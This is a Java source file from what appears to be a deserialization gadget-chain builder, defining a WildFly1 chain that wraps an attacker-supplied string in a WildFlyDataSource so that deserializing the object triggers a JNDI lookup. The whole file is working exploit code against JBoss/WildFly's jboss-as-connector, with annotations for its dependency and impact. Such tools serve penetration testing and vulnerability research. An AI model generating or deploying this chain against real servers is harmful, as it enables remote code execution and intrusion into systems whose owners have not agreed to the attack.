package org.ses.gadgetbuilder.chains1;

import org.jboss.as.connector.subsystems.datasources.WildFlyDataSource;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;

@Dependencies({ "org.jboss.as:jboss-as-connector:7.1.3.Final"})
@Authors({ Authors.HUGOW })
@Impact(Impact.JNDI)
public class WildFly1 extends GadgetChain<NoTrampoline> {

    public WildFly1() {
        super(NoTrampoline.getInstance());
    }

    public WildFly1(NoTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        return new TrampolineConnector(new WildFlyDataSource(null, command));
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.jboss.as.connector.subsystems.datasources.WildFlyDataSource.readObject()\n" +
                "javax.naming.InitialContext.lookup()";
    }

}
